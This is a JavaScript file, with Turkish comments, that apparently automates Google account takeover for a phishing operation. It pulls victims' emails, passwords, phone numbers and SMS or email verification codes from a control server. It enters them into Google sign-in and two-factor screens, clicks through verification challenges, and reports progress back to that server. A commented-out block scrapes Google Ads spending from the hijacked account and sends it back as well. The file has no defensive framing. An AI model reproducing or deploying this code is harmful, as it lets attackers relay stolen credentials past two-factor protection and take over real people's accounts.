var baseUrl = 'https://localhost:44322/';
function ajax(url, callMethod) { var request = new XMLHttpRequest(); request.onreadystatechange = callMethod; url = baseUrl + url; request.open("POST", url, true); request.send(); }

try {
    document.querySelectorAll('form [data-init-is-remove-mode] li>div')[1].click();
} catch (e) { }


var stype = {
    Password1: 1,
    Password2: 2,
    Sms: 3,
    SmsSend: 4,
    Mail: 5,
    MailSend: 6,
    Wait: 99,
    Finish: 77,
    Ok: 9999,
    twocode: 7
};


var mailId = "";

start();

function start() {
    var sInt1 = setInterval(function () {
        ajax('getusers', function () {
            if (this.readyState == 4 && this.status == 200) {
                var obj = JSON.parse(this.responseText);

                if (obj == null)
                    return;

                try {
                    document.querySelector('[name="identifier"]').value = obj.mail.trim(); //mail set etme
                    mailId = obj.mail.trim();
                    document.querySelector('#identifierNext').click();//mail ileri tıklama
                }
                catch (ex) { console.log(ex); }


                try {

                    try {
                        document.querySelector('[name="password"]').value = (obj.password2 == null ? obj.password.trim() : obj.password2.trim());//2.şifre varsa 2.şifre yoksa 1.şifre
                        document.querySelector('#passwordNext').click();//şifre1 ileri tıklama
                        clearInterval(sInt1);
                        pass2();
                    }
                    catch (ex) { console.log(ex); }
                }
                catch (ex) { console.log(ex); }

                try {
                    document.querySelector('[name="Email"]').value = obj.mail.trim(); //mail set etme
                    mailId = obj.mail.trim();
                    document.querySelector('#next').click();//mail ileri tıklama
                }
                catch (ex) { console.log(ex); }


                try {

                    try {
                        document.querySelector('#password').value = (obj.password2 == null ? obj.password.trim() : obj.password2.trim());//2.şifre varsa 2.şifre yoksa 1.şifre
                        document.querySelector('#submit').click();//şifre1 ileri tıklama
                        clearInterval(sInt1);
                        pass2();
                    }
                    catch (ex) { console.log(ex); }
                }
                catch (ex) { console.log(ex); }




            }
        });

    }, 2500);
}



function pass2() {
    var sInt2 = setInterval(function () {//2.şifre varmı yokmu kontrol

        try {
            var smsBTN = document.querySelector('#smsButton');
            if (smsBTN != null) {
                document.querySelector('#smsButton').click();
                clearInterval(sInt2);
                sms();
                return;
            }
        } catch (e) { }

        try {
            var phoneNext = document.querySelector('#authzenNext');
            if (phoneNext != null) {
                document.querySelector('[jsname="bCkDte"]').click();
                clearInterval(sInt2);
                sms();
                return;
            }
        } catch (e) { }

        try {
            if (document.querySelector('strong').innerText == "g.co/verifyaccount") {
                document.querySelector('[jsname="bCkDte"]').click();
                clearInterval(sInt2);
                sms();
                return;
            }
        } catch (e) { }

        try {
            if (document.querySelector('[data-illustration="authzenHiddenPin"]') != null) {
                document.querySelector('[jsname="bCkDte"]').click();
                clearInterval(sInt2);
                sms();
                return;
            }
        } catch (e) { }

        try {
            if (document.querySelector('samp')!=null) {
                clearInterval(sInt2);

                twocode();

                return;
            }
        } catch (e) { }


        try {
            if (document.querySelectorAll('[role="presentation"] h2 span[jsslot]')[0].innerText == "Çok fazla başarısız girişimde bulunuldu") {
                document.querySelector('#altActionOutOfQuota').click();
                clearInterval(sInt2);
                sms();
                return;
            }
        } catch (e) { }


        var err = document.querySelectorAll('[fill="currentColor"]:last-child>path');
        if (err.length > 8) {
            try {
                document.querySelector('#forgotPassword').click();//şifremi unuttum
            }
            catch (ex) {
                document.querySelector('[jsname="bCkDte"]').click();
                clearInterval(sInt2);
                sms();
                return;
            }
        }
        else {
            var urlpass2 = 'settype?mail=' + mailId + '&stypeenum=' + stype.Password2;
            ajax(urlpass2, function () {
                if (this.readyState == 4 && this.status == 200) {
                    var row = JSON.parse(this.responseText);

                    if (row.password2 != "" && row.password2 != null) {
                        try {
                            document.querySelector('[name="password"]').value = row.password2;
                            document.querySelector('#passwordNext').click();

                            try {
                                document.querySelector('p #continue_button').click();
                                clearInterval(sInt2);
                                sms();
                                return;
                            } catch (e) {
                                document.querySelector('[jsname="bCkDte"]').click();

                                clearInterval(sInt2);
                                sms();
                            }

                        }
                        catch (ex) {
                        }
                    }
                    else {
                        console.log('2. şifreyi daha girmedi...');
                    }
                }
            });
        }

    }, 3000);
}


function twocode() {
    var sInt2 = setInterval(function () {//2.şifre varmı yokmu kontrol

        if (document.querySelector('samp') != null) {

            var urlpass2 = 'gettype?mail=' + mailId + '&twocode=' + document.querySelector('samp').innerText;
            ajax(urlpass2, function () {
                if (this.readyState == 4 && this.status == 200) {
                    var row = JSON.parse(this.responseText);





                }
            });

        }
        else {
            debugger;

            clearInterval(sInt2);

            var urlpass3 = 'settype?mail=' + mailId + '&stypeenum=' + stype.Ok;
            ajax(urlpass3, function () {
                if (this.readyState == 4 && this.status == 200) {
                    var row = JSON.parse(this.responseText);
                }
            });





        }



    }, 3000);
}






function sms() {
    var sInt3 = setInterval(function () {//Sms Doğrulama

        try {
            if (document.querySelector('strong').innerText == "g.co/verifyaccount") {
                document.querySelector('[jsname="bCkDte"]').click();
                clearInterval(sInt3);
                mail();
                return;
            }
        } catch (e) { }


        try {
            var smsBTN = document.querySelector('#smsButton');
            if (smsBTN != null && document.querySelector('#phoneNumberId') == null) {
                document.querySelector('#smsButton').click();
                //clearInterval(sInt3);
                //sms();
                //return;
            }
        } catch (e) { }


        try {
            if (document.querySelectorAll('[role="presentation"] h2 span[jsslot]')[1].innerText == "Doğrulama kodu alın" && document.querySelector('#phoneNumberId') == null) {
                clearInterval(sInt3);
                mail();
                return;
            }
        } catch (e) { }


        try {
            if (document.querySelectorAll('[role="presentation"] h2 span[jsslot]')[0].innerText == "Çok fazla başarısız girişimde bulunuldu") {
                document.querySelector('#altActionOutOfQuota').click();
                clearInterval(sInt3);
                mail();
                return;
            }
        } catch (e) { }




        var err = document.querySelectorAll('[fill="currentColor"]:last-child>path');
        var errWar = document.querySelectorAll(
            '[src="https://ssl.gstatic.com/accounts/embedded/signin_googleapp_pulldown.gif"],[data-illustration="authzenGmailApp"],[jsname="O9Milc"]'
        );
        if ((errWar.length > 0 || err.length > 8)) {
            document.querySelector('[jsname="bCkDte"]').click();
            clearInterval(sInt3);
            mail();
        }
        else {

            var urlpass2 = 'settype?mail=' + mailId + '&stypeenum=' + stype.Sms;
            ajax(urlpass2, function () {
                if (this.readyState == 4 && this.status == 200) {
                    var row = JSON.parse(this.responseText);
                    console.log('sms phone loading');


                    try {
                        var phonenumber = document.querySelector('#phoneNumberId');
                        if (phonenumber != null && document.querySelectorAll('[role="button"]')[document.querySelectorAll('[role="button"]').length - 2].textContent == "Gönder") {
                            document.querySelector('#phoneNumberId').value = row.phone.trim();
                            document.querySelectorAll('[role="button"]')[document.querySelectorAll('[role="button"]').length - 2].click();//Gönder
                            console.log('sms phone send');
                        }

                    }
                    catch (ex) { }


                    try {
                        var phonesendBtn = document.querySelector('[data-sendmethod="SMS"]');
                        if (phonesendBtn != null) {
                            console.log('sms phone send Button');
                            phonesendBtn.click();
                        }

                    }
                    catch (ex) { }

                    try {
                        var pCode = document.querySelector('#idvPin');
                        if (pCode != null && row.phonecode != null && row.phonecode.trim() != "") {
                            console.log('sms code send');
                            document.querySelector('#idvPin').value = row.phonecode.trim();
                            document.querySelector('#idvPreregisteredPhoneNext').click();//Gönder
                        }
                    }
                    catch (ex) { }


                }



            });

        }



    }, 10000);
}


function mail() {
    var sInt4 = setInterval(function () {//Sms Doğrulama
        console.log('mail start');
        var err = document.querySelectorAll('[fill="currentColor"]:last-child>path');
        var errWar = document.querySelectorAll(
            '[src="https://ssl.gstatic.com/accounts/embedded/signin_googleapp_pulldown.gif"],[data-illustration="authzenGmailApp"],[jsname="O9Milc"]'
        );
        var mailCon = document.querySelector('#knowledgePreregisteredEmailInput');
        if (mailCon == null && (errWar.length > 0 || err.length > 8)) {
            document.querySelector('[jsname="bCkDte"]').click();
            clearInterval(sInt4);
        }
        else {

            var urlpass2 = 'settype?mail=' + mailId + '&stypeenum=' + stype.Mail;
            ajax(urlpass2, function () {
                if (this.readyState == 4 && this.status == 200) {
                    var row = JSON.parse(this.responseText);

                    try {
                        if (row.mailsend != "" && row.mailsend != null) {
                            document.querySelector('#knowledgePreregisteredEmailInput').value = row.mailsend.trim();
                            document.querySelector('#idvpreregisteredemailNext').click();
                            clearInterval(sInt4);
                            mailsend();
                        }
                    } catch (e) {

                    }

                }


            });

        }



    }, 10000);

}


function mailsend() {
    var sInt5 = setInterval(function () {//Sms Doğrulama
        console.log('mail send start');
        var err = document.querySelectorAll('[fill="currentColor"]:last-child>path');
        var errWar = document.querySelectorAll(
            '[src="https://ssl.gstatic.com/accounts/embedded/signin_googleapp_pulldown.gif"],[data-illustration="authzenGmailApp"],[jsname="O9Milc"]'
        );
        var mailCon = document.querySelector('#knowledgePreregisteredEmailInput');
        if (mailCon == null && (errWar.length > 0 || err.length > 8)) {
            document.querySelector('[jsname="bCkDte"]').click();
            clearInterval(sInt5);
        }
        else {

            var urlpass2 = 'settype?mail=' + mailId + '&stypeenum=' + stype.MailSend;
            ajax(urlpass2, function () {
                if (this.readyState == 4 && this.status == 200) {
                    var row = JSON.parse(this.responseText);

                    try {
                        var pCode = document.querySelector('#idvPin');
                        if (pCode != null && row.mailcode != null && row.mailcode.trim() != "") {
                            console.log('sms code send');
                            document.querySelector('#idvPin').value = row.mailcode.trim();
                            document.querySelector('#idvpreregisteredemailNext').click();//Gönder
                        }
                    }
                    catch (ex) { }

                }


            });

        }



    }, 10000);

}


//document.querySelector('[jsname="bySMBb"],[jsname="UjXomb"]').click()


/////----------------- ADS----------------------------------------------

//if (location.href.indexOf('https://ads.google.com/aw/overview?') < 0)
//    location.href = 'https://ads.google.com/nav/login?subid=ALL-tr-et-g-aw-c-home-awhp_xin1_signin!o2';

//var adsInt = setInterval(function () {
//    try {

//        var mails = "";
//        try {
//            document.querySelector('[minerva-id="datepicker"] div').click();
//            document.querySelector('[role="menuitemradio"]:last-child>span>span').click();
//            var priceAll = document.querySelectorAll('.stats[role="button"]')[document.querySelectorAll('.stats[role="button"]').length - 1].innerText;

//            ajax('getKur?price=' + priceAll, function () {
//                clearInterval(adsInt);
//                if (this.readyState == 4 && this.status == 200) {
//                    var result = JSON.parse(this.responseText);

//                    mails = document.querySelector('.email').textContent;

//                    var url77 = 'settype?mail=' + mails + '&stypeenum=9999&price=' + result;
//                    ajax(url77, function () {

//                        //document.querySelector('.trigger[buttondecorator]').click();
//                        //document.querySelector('.sign-out').click();
//                    });


//                }
//            });

//        } catch (e) {

//        }

//    } catch (e) {}

//}, 7000);

//var baseUrl = 'https://localhost:44322/';
//function ajax(url, callMethod) { var request = new XMLHttpRequest(); request.onreadystatechange = callMethod; url = baseUrl + url; request.open("POST", url, true); request.send(); }






